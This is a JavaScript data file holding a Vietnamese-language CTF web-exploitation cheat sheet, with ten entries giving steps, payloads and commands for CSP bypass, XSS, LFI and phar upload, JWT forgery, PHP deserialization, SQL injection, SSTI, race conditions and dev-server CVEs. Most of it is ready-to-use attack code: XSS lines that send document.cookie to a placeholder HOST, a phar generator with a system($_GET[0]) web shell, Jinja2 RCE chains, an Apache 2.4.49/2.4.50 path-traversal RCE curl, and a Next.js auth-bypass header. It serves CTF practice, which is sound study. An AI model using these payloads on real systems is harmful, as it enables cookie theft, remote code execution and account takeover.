const C = (...lines) => lines.join("\n");

const web = [
  {
    id: "pattern-multiflag-recon",
    group: "Web patterns",
    title: "Multi-flag recon",
    category: "Web",
    summary: "Challenge nói có nhiều flag hoặc flag tổng: gom flag từ source, comment, asset, endpoint ẩn rồi mới submit.",
    tags: ["recon", "multi-flag", "source", "nasa"],
    priority: "high",
    steps: [
      "View-source HTML, comment, meta, response header.",
      "Check asset CSS/SVG/JS/robots/sitemap; tìm comment/metadata.",
      "Dò endpoint ẩn từ JS/comment: secret, flag, admin, backup.",
      "Decode base64/hex/URL; gom đủ các phần trước khi submit flag tổng."
    ],
    payloads: [],
    commands: [
      {
        title: "Gom nguồn",
        code: C(
          "curl -s http://TARGET/ | grep -iE 'flag|BKSEC|secret|<!--|src=|href='",
          "curl -s http://TARGET/robots.txt",
          "curl -s http://TARGET/assets/style.css | grep -iE 'flag|BKSEC|<!--'",
          "curl -s http://TARGET/assets/logo.svg | grep -iE 'flag|BKSEC|<!--'"
        )
      }
    ],
    gotchas: [
      "Đừng submit flag lẻ khi đề yêu cầu flag tổng.",
      "Flag hay nằm trong comment CSS/SVG/JS, không chỉ HTML.",
      "Đọc kỹ title/description để biết có mấy phần."
    ],
    links: [
      { title: "PayloadsAllTheThings", url: "https://github.com/swisskyrepo/PayloadsAllTheThings" }
    ]
  },
  {
    id: "pattern-csp-bypass",
    group: "Web patterns",
    title: "CSP bypass",
    category: "Web",
    summary: "CSP không chỉ để đọc: tìm host allowlist/gadget, filter one-pass, hoặc làm mất CSP header.",
    tags: ["csp", "xss", "waf", "easy-csp", "medium-csp", "angularjs"],
    priority: "high",
    steps: [
      "Đọc CSP: script-src, script-src-elem, nonce/hash, report-uri.",
      "Liệt kê host allowlist; tìm JSONP/Angular/Prototype/UMD trên CDN.",
      "Nếu filter xóa keyword một lần: dùng `scrscriptipt`/`styscriptle` để nó sinh lại `script`/`style`.",
      "Nếu cần bỏ CSP: thử parameter pollution/header injection làm warning trước khi header gửi.",
      "Exfil cookie/CSRF token qua same-origin fetch hoặc redirect bot."
    ],
    payloads: [
      {
        title: "AngularJS + Prototype từ CDN",
        code: C(
          "<script src='https://cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js'></script>",
          "<script src='https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.1/angular.js'></script>",
          "<div ng-app ng-csp>{{$on.curry.call().top.location='https://HOST/?c='+$on.curry.call().top.document.cookie}}</div>"
        )
      },
      {
        title: "Filter one-pass + parameter pollution",
        code: C(
          "?msg=<scrscriptipt>fetch('https://HOST/?c='+document.cookie)</scrscriptipt>",
          "&P1=&P2=&P3=...&P1000="
        )
      }
    ],
    commands: [],
    gotchas: [
      "script-src-elem có thể override script-src.",
      "Filter replace một lần, không đệ quy: lồng keyword.",
      "CSP mất do warning/header đã gửi, không phải do payload."
    ],
    links: [
      { title: "PortSwigger CSP", url: "https://portswigger.net/web-security/cross-site-scripting/content-security-policy" }
    ]
  },
  {
    id: "pattern-xss-waf-bot",
    group: "Web patterns",
    title: "XSS + WAF + bot",
    category: "Web",
    summary: "Stored/reflected XSS có bot/report: bypass blocklist tag/event, exfil cookie/CSRF token.",
    tags: ["xss", "waf", "bot", "stored", "report-violations", "bksecpad"],
    priority: "high",
    steps: [
      "Xác định context: HTML, attribute, JS string, URL.",
      "Test tag/event cơ bản; nếu bị chặn, dùng blocklist bypass: tag lạ + event lạ.",
      "Chuẩn bị webhook/OAST; payload fetch same-origin hoặc redirect.",
      "Report/comment cho bot; đọc cookie/CSRF token/flag."
    ],
    payloads: [
      {
        title: "Basic exfil",
        code: "<script>fetch('https://HOST/?c='+document.cookie)</script>"
      },
      {
        title: "WAF tag/event lạ",
        code: C(
          "<style>@keyframes x{}</style>",
          "<b style=\"animation-name:x\" onwebkitanimationstart=\"fetch('https://HOST/?c='+document.cookie)\"></b>"
        )
      }
    ],
    commands: [],
    gotchas: [
      "Cookie HttpOnly: mục tiêu thường là CSRF token trong HTML.",
      "Bot timeout ngắn; payload phải chạy ngay.",
      "Blocklist thiếu event/tag lạ; đọc waf.py nếu có source."
    ],
    links: [
      { title: "PortSwigger XSS cheat sheet", url: "https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" }
    ]
  },
  {
    id: "pattern-phar-chain",
    group: "Web patterns",
    title: "LFI + upload + phar",
    category: "Web",
    summary: "Có include/page/upload: đọc source, upload .phar giả ảnh, include bằng phar:// để RCE.",
    tags: ["lfi", "phar", "upload", "php", "three-steps", "red-pill"],
    priority: "high",
    steps: [
      "LFI đọc source: `php://filter/convert.base64-encode/resource=index.php`.",
      "Đọc source tìm check extension/upload/disable_functions.",
      "Tạo phar, rename `.jpg`/`.png` để qua check đuôi.",
      "Include `phar:///path/upload/shell.jpg/shell.php` để trigger.",
      "Bypass disable_functions: FFI, LD_PRELOAD, mem-patch, /readflag."
    ],
    payloads: [
      {
        title: "LFI source",
        code: C(
          "?page=php://filter/convert.base64-encode/resource=index.php",
          "?page=phar:///var/www/html/user_submissions/shell.jpg/shell.php"
        )
      },
      {
        title: "Phar generator",
        code: C(
          "<?php",
          "$p=new Phar('shell.phar');",
          "$p->startBuffering();",
          "$p->addFromString('shell.php','<?php system($_GET[0]); ?>');",
          "$p->setStub('<?php __HALT_COMPILER(); ?>');",
          "$p->stopBuffering();",
          "?>"
        )
      }
    ],
    commands: [],
    gotchas: [
      "Phar cần include bằng phar:// mới trigger.",
      "Có thể phải rename shell.phar -> shell.jpg sau khi tạo.",
      "Upload check đuôi ảnh nhưng không check nội dung."
    ],
    links: [
      { title: "HackTricks phar", url: "https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/phar-deserialization.html" }
    ]
  },
  {
    id: "pattern-jwt-auth",
    group: "Web patterns",
    title: "JWT / JWKS / mass assignment",
    category: "Web",
    summary: "Auth bằng JWT: thử alg none/weak/kid/jku, JWKS lộ key, hoặc signup nhận role trực tiếp.",
    tags: ["jwt", "jwks", "auth", "mass-assignment", "gambling-coin", "low2"],
    priority: "high",
    steps: [
      "Decode header/payload; xem alg, kid, jku, role.",
      "Thử alg none, weak HS256, kid traversal, jku/x5u trỏ JWKS của bạn.",
      "Xem JWKS endpoint có lộ private key không.",
      "Kiểm tra signup/update có nhận `role`/`is_admin` trực tiếp (mass assignment).",
      "Dùng token admin gọi route admin/secret."
    ],
    payloads: [
      {
        title: "Signup role admin",
        code: "{\"username\":\"u\",\"password\":\"p\",\"full_name\":\"u\",\"role\":\"admin\"}"
      },
      {
        title: "JWT alg none",
        code: C(
          "import base64, json",
          "b64=lambda x: base64.urlsafe_b64encode(json.dumps(x,separators=(',',':')).encode()).rstrip(b'=').decode()",
          "print(b64({'alg':'none','typ':'JWT'}) + '.' + b64({'role':'admin'}) + '.')"
        )
      }
    ],
    commands: [],
    gotchas: [
      "Đừng chỉ thử alg none; kiểm tra signup/mass assignment trước.",
      "Route admin có thể ẩn sau middleware — đọc source.",
      "JWKS public bình thường; chỉ nguy hiểm nếu lộ private key."
    ],
    links: [
      { title: "PortSwigger JWT", url: "https://portswigger.net/web-security/jwt" }
    ]
  },
  {
    id: "pattern-php-cookie",
    group: "Web patterns",
    title: "PHP serialized cookie",
    category: "Web",
    summary: "Cookie base64 chứa `O:...`: object injection, sửa stats, loose compare chữ ký.",
    tags: ["php", "deserialization", "cookie", "happy-soldier", "type-juggling"],
    priority: "high",
    steps: [
      "Decode cookie/base64; nhận diện PHP serialize.",
      "Tìm source (`?src=1`, backup, LFI) để biết điều kiện thắng/magic method.",
      "Sửa thuộc tính object; giữ đúng độ dài string serialize.",
      "Nếu có chữ ký: thử loose compare `==` với `true`/magic hash.",
      "Base64 lại cookie; gửi request."
    ],
    payloads: [
      {
        title: "Sửa stats",
        code: 'O:6:"Player":4:{s:6:"health";i:100;s:6:"attack";i:99999999999999999;s:5:"coins";i:0;s:6:"weapon";s:32:"Golden Ultimate Extra Long Sword";}'
      },
      {
        title: "Loose compare chữ ký",
        code: 'O:6:"Player":5:{s:6:"health";i:100;s:6:"attack";i:10;s:5:"coins";i:0;s:6:"weapon";s:12:"Golden Sword";s:3:"sig";b:1;}'
      }
    ],
    commands: [],
    gotchas: [
      "Độ dài `s:N:\"...\"` phải khớp chính xác.",
      "PHP 8 khác PHP 7 ở so sánh lỏng.",
      "Source có thể lộ qua param `src`/debug."
    ],
    links: [
      { title: "PortSwigger deserialization", url: "https://portswigger.net/web-security/deserialization" }
    ]
  },
  {
    id: "pattern-sqli-context",
    group: "Web patterns",
    title: "SQLi login/sort",
    category: "Web",
    summary: "SQLi phụ thuộc context: login MySQL, sort/order, SQLite blind; luôn xác định DBMS trước.",
    tags: ["sqli", "mysql", "sqlite", "low-effort-sns", "ezzz"],
    priority: "high",
    steps: [
      "Thử quote ở từng param, không chỉ password.",
      "Xác định DBMS bằng lỗi/version/hàm.",
      "Login MySQL: `' OR 1=1 LIMIT 1 #` nếu server đếm row.",
      "Sort/order: inject `(CASE WHEN cond THEN date ELSE title END)`.",
      "SQLite: dùng `sqlite_master`, `SUBSTRING`, blind theo row đầu."
    ],
    payloads: [
      {
        title: "MySQL login",
        code: "' OR 1=1 LIMIT 1 #"
      },
      {
        title: "SQLite CASE blind",
        code: C(
          "/sort?key=(CASE WHEN (SELECT SUBSTR(secret,1,1) FROM flag)='B' THEN date ELSE title END)",
          "/sort?key=(SELECT group_concat(tbl_name,'~') FROM sqlite_master WHERE type='table')"
        )
      }
    ],
    commands: [],
    gotchas: [
      "Password bị hash thì chèn SQLi ở password thường fail.",
      "mysqli_num_rows cần LIMIT 1.",
      "SQLite không có information_schema."
    ],
    links: [
      { title: "PayloadsAllTheThings SQLi", url: "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection" }
    ]
  },
  {
    id: "pattern-ssti",
    group: "Web patterns",
    title: "SSTI WAF bypass",
    category: "Web",
    summary: "Template injection: nhận diện engine, bypass keyword `_`/config bằng attr/getitem/hex.",
    tags: ["ssti", "jinja2", "twig", "todo-app"],
    priority: "high",
    steps: [
      "Polyglot `${{<%[%'\"}}%\\`; test `{{7*7}}`, `${7*7}`, `<%= 7*7 %>`.",
      "Xác định engine (Jinja2/Twig/Freemarker).",
      "Nếu WAF chặn keyword, dùng attr/getitem hoặc hex escape dấu `_`.",
      "Đi từ object/globals đến os.popen/exec.",
      "Đọc flag hoặc RCE."
    ],
    payloads: [
      {
        title: "Jinja2",
        code: C(
          "{{7*7}}",
          "{{ cycler.__init__.__globals__.os.popen('id').read() }}",
          "{{ cycler|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')() }}"
        )
      },
      {
        title: "Hex bypass",
        code: "{{ cycler|attr('\\x5f\\x5finit\\x5f\\x5f')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('os')|attr('popen')('id')|attr('read')() }}"
      }
    ],
    commands: [],
    gotchas: [
      "WAF chặn keyword, không chặn logic.",
      "Sandbox có thể chặn __globals__.",
      "Blind SSTI: dùng time/outbound request."
    ],
    links: [
      { title: "HackTricks SSTI", url: "https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html" }
    ]
  },
  {
    id: "pattern-logic-type",
    group: "Web patterns",
    title: "Logic / type juggling",
    category: "Web",
    summary: "Game coin/coupon/quantity: đọc điều kiện thắng, thử string→number, decimal, số âm, race.",
    tags: ["logic", "type-juggling", "race", "gambling-coin", "double-or-nothing"],
    priority: "high",
    steps: [
      "Đọc điều kiện thắng và field server dùng để validate (coins/display/quantity).",
      "Thử string số: `1000a`, `1e10`, `0e...`; xem server ép kiểu gì.",
      "Thử decimal nhỏ nếu server lấy phần nguyên/chữ số đầu.",
      "Thử số âm, array, object, prototype pollution.",
      "Thử race: gửi nhiều request song song."
    ],
    payloads: [
      {
        title: "Type juggling",
        code: C(
          "bet_amount=1000a",
          "amount=0.9999999901",
          "amount=-1000"
        )
      },
      {
        title: "Race",
        code: C(
          "import requests, concurrent.futures",
          "def go(i): return requests.post('http://TARGET/api/bet',json={'amount':1}).status_code",
          "with concurrent.futures.ThreadPoolExecutor(max_workers=30) as ex: list(ex.map(go,range(30)))"
        )
      }
    ],
    commands: [],
    gotchas: [
      "Đừng chỉ sửa coins; server có thể validate display/quantity.",
      "PHP 7 vs 8 khác type juggling.",
      "Race cần đúng timing; thử gate/pipeline."
    ],
    links: [
      { title: "PayloadsAllTheThings", url: "https://github.com/swisskyrepo/PayloadsAllTheThings" }
    ]
  },
  {
    id: "pattern-devserver-cve",
    group: "Web patterns",
    title: "Dev server / middleware / version CVE",
    category: "Web",
    summary: "Source map, Vite/Next.js dev server, Apache cũ: đọc version rồi dùng CVE/middleware bypass.",
    tags: ["vite", "nextjs", "apache", "cve", "opensource", "middleware"],
    priority: "medium",
    steps: [
      "View-source/header: Vite, Next.js, Apache, version, source map.",
      "Vite dev server: thử `@fs` + `?raw` đọc file ngoài root.",
      "Next.js: thử header `X-Middleware-Subrequest` để bypass auth.",
      "Apache 2.4.49/2.4.50: thử CVE path traversal `/cgi-bin/.%%32%65/...`.",
      "Đọc source/flag theo CVE."
    ],
    payloads: [
      {
        title: "Vite file read",
        code: "GET /@fs//etc/flag?raw"
      },
      {
        title: "Next.js middleware bypass",
        code: "X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware"
      },
      {
        title: "Apache 2.4.50",
        code: "curl --path-as-is 'http://TARGET/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash' -d 'echo Content-Type: text/plain; echo; id'"
      }
    ],
    commands: [],
    gotchas: [
      "CVE phụ thuộc version; check header/Last-Modified.",
      "Dev server không nên public — nhưng CTF thì có.",
      "Source map/base64 comment thường lộ version."
    ],
    links: [
      { title: "PortSwigger", url: "https://portswigger.net/web-security" }
    ]
  }
];

export default web;
